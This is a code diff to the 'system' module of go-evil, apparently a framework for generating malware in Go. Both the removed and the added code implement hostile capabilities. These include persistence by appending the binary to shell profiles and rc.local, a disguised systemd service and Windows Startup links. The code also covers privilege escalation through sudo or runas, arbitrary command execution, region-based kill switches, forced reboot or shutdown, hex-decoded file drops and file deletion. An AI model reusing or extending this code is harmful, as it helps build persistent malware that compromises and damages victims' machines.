@@ -1,194 +1,410 @@
 package system
 
 import (
-	"bufio"
-	"encoding/hex"
 	"fmt"
-	"os"
-	"os/exec"
-	"os/user"
-	"runtime"
 	"strings"
 
-	"github.com/s9rA16Bf4/go-evil/domains/malware"
-	"github.com/s9rA16Bf4/go-evil/utility/contains"
-	"github.com/s9rA16Bf4/go-evil/utility/converter"
-	"github.com/s9rA16Bf4/go-evil/utility/io"
-	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
-	"github.com/s9rA16Bf4/notify_handler/go/notify"
-	"gopkg.in/go-rillas/subprocess.v1"
+	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/tools"
 )
 
-type system_t struct {
-	file_name        string
-	output_directory string // Where should the output be placed. Only used when creating a file currently
+//
+//
+// Exits the malware
+//
+//
+func Exit(s_json string, return_code string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+
+	function_call := "Exit"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(lvl string){", function_call),
+		"lvl = spine.variable.get(lvl)",
+		"value := tools.String_to_int(lvl)",
+		"os.Exit(value)",
+
+		"}"})
+
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+	data_object.Add_go_import("os")
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, return_code)}, structure.Send(data_object)
 }
 
-var c_system system_t
+//
+//
+// Prints a message to the screen
+//
+//
+func Out(s_json string, msg string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Out"
 
-func Exit(status_lvl string) {
-	status_lvl = run_time.Check_if_variable(status_lvl)
-	value := converter.String_to_int(status_lvl, "system.Exit()")
-	if value == -1 {
-		return
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(msg []int){", function_call),
+		"s_msg := spine.alpha.construct_string(msg)",
+		"s_msg = spine.variable.get(s_msg)",
+		"fmt.Print(s_msg)",
+		"}"})
+
+	data_object.Add_go_import("fmt")
+
+	// Construct our int array
+	parameter := "[]int{"
+	for _, repr := range tools.Generate_int_array(msg) {
+		parameter += fmt.Sprintf("%d,", repr)
 	}
-	os.Exit(value)
+	parameter += "}"
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
 
-func Out(msg string) {
-	msg = run_time.Check_if_variable(msg)
-	fmt.Println(msg)
-}
+//
+//
+// Prints a message to the screen, but appends a newline at the end of each print
+//
+//
+func Outln(s_json string, msg string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Outln"
 
-func AddToStartup() {
-	malware_name, _ := os.Executable() // Grabs also were we currently are
-	switch runtime.GOOS {
-	case "linux":
-		// Target bash & rc.local
-		target := []string{"/etc/profile", "~/.bash_profile", "~/.bash_login", "~/.profile", "/etc/rc.local"}
-		for _, line := range target {
-			in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)
-			if err == nil {
-				in.WriteString("sudo ." + malware_name + " &") // & tells it to run in the background
-			}
-		}
-		// Target systemd
-		in, err := os.Create("/lib/systemd/system/tcp.service")
-		if err == nil {
-			write := bufio.NewWriter(in)
-			what_to_write := []string{
-				"[Unit]",
-				"Description=My Sample Service",
-				"After=multi-user.target",
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(msg []int){", function_call),
+		"s_msg := spine.alpha.construct_string(msg)",
+		"s_msg = spine.variable.get(s_msg)",
+		"fmt.Println(s_msg)",
+		"}"})
 
-				"[Service]",
-				"Type=idle",
-				"ExecStart=." + malware_name,
+	data_object.Add_go_import("fmt")
 
-				"[Install]",
-				"WantedBy=multi-user.target",
-			}
-			for _, line := range what_to_write {
-				write.WriteString(line + "\n")
-			}
-			exec.Command("sudo", "systemctl", "enable", "tcp.service").Run() // Enable it
-			exec.Command("sudo", "systemctl", "start", "tcp.service").Run()  // Run it
-		}
-	case "windows":
-		os.Link(malware_name, "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")     // Running user
-		os.Link(malware_name, "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") // All users
+	// Construct our int array
+	parameter := "[]int{"
+	for _, repr := range tools.Generate_int_array(msg) {
+		parameter += fmt.Sprintf("%d,", repr)
 	}
+	parameter += "}"
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
 }
 
-func User_input() {
-	var input string
-	fmt.Scanln(&input)           // This takes the user input and puts the result into input
-	run_time.Set_variable(input) // Save the input
+//
+//
+// Executes a command on the running OS and prints the result
+//
+//
+func Exec(s_json string, cmd string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Exec"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(cmd string){", function_call),
+		"cmd = spine.variable.get(cmd)",
+		"split_cmd := strings.Split(cmd, \" \")",
+		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
+		"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
+		"out, err := exec.Command(cmd, args).Output()",
+		"if err != nil {",
+		"fmt.Println(err.Error())",
+		"}else{",
+		"fmt.Println(string(out[:]))",
+		"}}"})
+
+	data_object.Add_go_import("os/exec")
+	data_object.Add_go_import("fmt")
+	data_object.Add_go_import("strings")
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, cmd)}, structure.Send(data_object)
 }
 
-func Elevate() {
-	executable_location, _ := os.Getwd()  // The working directory
-	executable_location += os.Args[0][1:] // The malwares name
+//
+//
+// Disables boot of the program in certain countries
+// The countries are determined by value returned by jibber_jabber, formatted in ISO 639
+//
+//
+func Abort(s_json string, languages string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Abort"
 
-	switch runtime.GOOS {
-	case "windows":
-		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-		if err != nil { // We currently are not administrators
-			executable_location = "runas /user:administrator " + executable_location
-			resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
-			run_time.Set_variable(resp.StdOut)
-		}
-	case "linux":
-		user, err := user.Current()
-		if err != nil {
-			notify.Error(err.Error(), "system.Elevate()")
-		} else {
-			if user.Username != "root" { // We are not root
-				executable_location = "sudo " + executable_location
-				resp := subprocess.RunShell("", "", strings.Split(executable_location, " ")...)
-				run_time.Set_variable(resp.StdOut)
-			}
-		}
+	arr := structure.Create_evil_object(languages)
 
-	}
+	arr.Uppercase()                          // Makes the contents of the array to uppercase
+	language_array := arr.To_string("array") // Returns []string{<content>}
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(languages []string){", function_call),
+		"computer_lang, err := jibber_jabber.DetectTerritory()",
+		"if err != nil {",
+		"fmt.Println(err.Error())",
+		"}else{",
+		"for _, lang := range languages{",
+		"if lang == computer_lang{",
+		"os.Exit(0)",
+		"}}}}"})
+
+	data_object.Add_go_import("os")
+	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}, structure.Send(data_object)
 }
 
-func ReadFile(file string) {
-	file = run_time.Check_if_variable(file)
-	open_file, err := os.Open(file)
-	if err != nil {
-		notify.Error(err.Error(), "system.ReadFile()")
+//
+//
+// Reboots the computer
+//
+//
+func Reboot(s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Reboot"
+
+	cmd := ""
+	if data_object.Target_os == "windows" {
+		cmd = "shutdown /r"
 	} else {
-		var content string
-		scanner := bufio.NewScanner(open_file)
-		scanner.Split(bufio.ScanLines)
-		for scanner.Scan() {
-			content += scanner.Text()
-		}
-		run_time.Set_variable(content)
+		cmd = "shutdown -r now"
 	}
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+
+		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
+		"}"})
+
+	data_object.Add_go_import("os/exec")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 
 }
 
-func Reboot() {
-	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
-		io.Run_file("shutdown -r now")
-	} else if runtime.GOOS == "windows" {
-		io.Run_file("shutdown /r")
-	}
-}
-func Shutdown() {
-	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
-		io.Run_file("shutdown -h now")
-	} else if runtime.GOOS == "windows" {
-		io.Run_file("shutdown /s")
-	}
-}
+//
+//
+// Shutdowns the computer
+//
+//
+func Shutdown(s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Shutdown"
 
-func CreateFile(content string) {
-	content = run_time.Check_if_variable(content)
-
-	if c_system.file_name == "" {
-		Set_filename(malware.Generate_random_name(64))
-	}
-	if c_system.output_directory == "" {
-		Set_output("./")
-	}
-
-	file, err := os.Create(c_system.output_directory + c_system.file_name)
-	if err != nil {
-		notify.Error(err.Error(), "system.CreateFile()")
+	cmd := ""
+	if data_object.Target_os == "windows" {
+		cmd = "shutdown /s"
 	} else {
-		_, err = hex.DecodeString(content)
-		if err == nil { // Its a text
-			file.WriteString(content)
-		} else {
-			splitted_data := strings.Split(content, "\n")
-			for _, read_data := range splitted_data {
-				data, _ := hex.DecodeString(read_data)
-				file.Write(data)
-			}
-		}
-
-		file.Close()
-		run_time.Set_variable(c_system.file_name) // Filename
+		cmd = "shutdown -h now"
 	}
 
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+
+		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
+		"}"})
+
+	data_object.Add_go_import("os/exec")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 }
 
-func RunCommand(command string) {
-	command = run_time.Check_if_variable(command)
-	resp := io.Run_file(command)
-	run_time.Set_variable(resp)
-}
+//
+//
+// Add the malware to startup
+//
+//
+func Add_to_startup(s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Add_2_startup"
 
-func Set_filename(new_file_name string) {
-	c_system.file_name = new_file_name
-}
+	if data_object.Target_os == "windows" {
+		data_object.Add_go_function([]string{
+			fmt.Sprintf("func %s(){", function_call),
+			"malware_path, _ := os.Executable()",
+			"os.Link(malware_path, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
+			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
+			"}"})
 
-func Set_output(new_dir string) {
-	if !contains.EndsWith(new_dir, []string{"/"}) {
-		new_dir += "/"
+	} else {
+		data_object.Add_go_function([]string{
+			fmt.Sprintf("func %s(){", function_call),
+			"malware_path, _ := os.Executable()",
+
+			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
+			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
+			"if err == nil {",
+			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
+			"}",
+			"}",
+
+			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
+			"if err == nil {",
+			"write := bufio.NewWriter(in)",
+			"what_to_write := []string{",
+			"\"[Unit]\",",
+			"\"Description=My Sample Service\",",
+			"\"After=multi-user.target\",",
+
+			"\"[Service]\",",
+			"\"Type=idle\",",
+			"\"ExecStart=.malware_path\",",
+
+			"\"[Install]\",",
+			"\"WantedBy=multi-user.target\",",
+
+			"}",
+
+			"for _, line := range what_to_write {",
+			"write.WriteString(line)",
+			"}",
+			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
+			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()",
+			"}}"})
 	}
-	c_system.output_directory = new_dir
+	data_object.Add_go_import("os/exec")
+	data_object.Add_go_import("bufio")
+
+	data_object.Add_go_import("os")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
+// Writes a provided content to a provided file
+//
+//
+func write(s_json string, value string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "Write"
+
+	arr := structure.Create_evil_object(value)
+	path := arr.Get(0)
+	data := strings.Join(arr.Get_between(1, arr.Length()), " ")
+
+	if data_object.Check_global_name(data) { // Checks if what we got is a global variable
+		data = tools.Erase_delimiter(data, []string{"\""}, -1)
+	}
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(path string, content string){", function_call),
+		"path = spine.variable.get(path)",
+		"content = spine.variable.get(content)",
+
+		"file, result := os.Create(path)",
+		"if result == nil{",
+		"defer file.Close()",
+		"result := tools.Starts_with(content, []string{\"[HEX];\"})",
+		"if ok := result[\"[HEX];\"]; !ok {",
+		"file.WriteString(content)",
+		"}else{",
+		"split := strings.Split(content, \",\")",
+		"for _, data := range split {",
+		"data, _ := hex.DecodeString(data)",
+		"file.Write(data)",
+		"}}}}",
+	})
+
+	data_object.Add_go_import("encoding/hex")
+	data_object.Add_go_import("os")
+	data_object.Add_go_import("strings")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
+
+	return []string{fmt.Sprintf("%s(\"%s\", \"%s\")", function_call, path, data)}, structure.Send(data_object)
+}
+
+//
+//
+// Reads the contents of a file and places the result into a runtime variable
+//
+//
+func read(s_json string, value string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "read"
+	value = tools.Erase_delimiter(value, []string{"\""}, -1)
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(path string){", function_call),
+		"path = spine.variable.get(path)",
+		"gut, err := ioutil.ReadFile(path)",
+		"if err == nil{",
+		"spine.variable.set(string(gut))",
+		"}}"})
+
+	data_object.Add_go_import("io/ioutil")
+
+	return []string{fmt.Sprintf("%s(\"%s\")", function_call, value)}, structure.Send(data_object)
+
+}
+
+//
+//
+// Reads the contents of a directory and places the result into a runtime variable
+//
+//
+func list_dir(s_json string, value string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "list_dir"
+	arr := structure.Create_evil_object(value)
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(config []string){", function_call),
+		"if len(config) < 2{",
+		"notify.Error(\"The provided evil array does not contain all required values\", \"system.list_dir()\")",
+		"}",
+		"obj_type := spine.variable.get(config[0])",
+		"path := spine.variable.get(config[1])",
+		"result, err := ioutil.ReadDir(path)",
+		"if err == nil{",
+		"evil_array := \"${\"",
+		"for _, file := range result{",
+		"if obj_type == \"file\" && !file.IsDir() || obj_type == \"dir\" && file.IsDir() || obj_type == \"\" {",
+		"evil_array += fmt.Sprintf(\"\\\"%s/%s\\\",\", path, file.Name())",
+		"}",
+		"}",
+		"evil_array += \"}$\"",
+		"spine.variable.set(evil_array)",
+		"}}"})
+
+	data_object.Add_go_import("io/ioutil")
+	data_object.Add_go_import("fmt")
+	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, arr.To_string("array"))}, structure.Send(data_object)
+
+}
+
+//
+//
+// Takes a user input and saves the result in a runtime variable
+//
+//
+func input(s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "input"
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"var input string",
+		"fmt.Scanln(&input)",
+		"spine.variable.set(input)",
+		"}"})
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+
+}
+
+//
+//
+// Removes the target file and folder if they are empty
+//
+//
+func remove(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "remove"
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(target string){", function_call),
+		"target = spine.variable.get(target)",
+		"os.Remove(target)",
+		"}"})
+
+	data_object.Add_go_import("os")
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, value)}, structure.Send(data_object)
+
 }
